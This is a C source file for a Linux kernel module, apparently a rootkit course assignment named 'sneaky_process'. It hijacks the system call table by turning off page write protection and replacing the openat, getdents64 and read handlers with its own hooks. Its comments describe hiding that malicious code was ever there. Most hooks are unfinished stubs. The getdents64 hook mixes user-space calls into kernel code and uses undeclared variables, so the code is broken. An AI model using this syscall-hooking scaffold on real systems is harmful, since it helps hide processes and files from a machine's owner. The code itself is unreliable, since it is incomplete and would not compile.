#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>    // Contains function e.g. kallsyms_lookup_name
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <asm/paravirt.h>

#include <linux/unistd.h>        // for system call constants
#include <linux/version.h>
#include <linux/dirent.h>      // Contains dirent structs etc


#define _GNU_SOURCE
#include <dirent.h>     /* Defines DT_* constants */
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/syscall.h>

#define PREFIX "sneaky_process"

#define handle_error(msg) \
               do { perror(msg); exit(EXIT_FAILURE); } while (0)

struct linux_dirent64 {
               ino64_t        d_ino;    /* 64-bit inode number */
               off64_t        d_off;    /* 64-bit offset to next structure */
               unsigned short d_reclen; /* Size of this dirent */
               unsigned char  d_type;   /* File type */
               char           d_name[]; /* Filename (null-terminated) */
           };



//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(int dirfd, const char *pathname, int flags);
asmlinkage int (*original_getdents64)(int fd, void *dirp, size_t count);
asmlinkage int (*original_read)(int fd, void *buf, size_t count);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  //return (*original_openat)(regs);
  return 0;

}

asmlinkage int sneaky_sys_getdents64(int fd, void *dirp, size_t count)
{
  long nread;
  // Implement the sneaky part here
  nread = original_getdents64(fd, dirp, count);
  if (nread == -1)
    handle_error("getdents");
  if (nread == 0)
    return 0;

  for(long bpos = 0; bpos < nread;){
    d = (struct linux_dirent64 *) (buf + bpos);
    printf("%8ld  ", d->d_ino);
    d_type = *(buf + bpos + d->d_reclen - 1);
    printf("%-10s ", (d_type == DT_REG) ?  "regular" :
                    (d_type == DT_DIR) ?  "directory" :
                    (d_type == DT_FIFO) ? "FIFO" :
                    (d_type == DT_SOCK) ? "socket" :
                    (d_type == DT_LNK) ?  "symlink" :
                    (d_type == DT_BLK) ?  "block dev" :
                    (d_type == DT_CHR) ?  "char dev" : "???");
    printf("%4d %10jd  %s\n", d->d_reclen,
            (intmax_t) d->d_off, d->d_name);
    bpos += d->d_reclen;
  }
  return 0;
}

asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
{
  // Implement the sneaky part here
  //return (*original_read)(regs);
  return 0;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  int err = 1;
  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  #if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
  #else
    sys_call_table = NULL;
  #endif

  if(sys_call_table == 0){
    printk(KERN_INFO "error: sys_call_table == null");
    return err;
  }
    

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  // You need to replace other system calls you need to hack here
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;


  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");


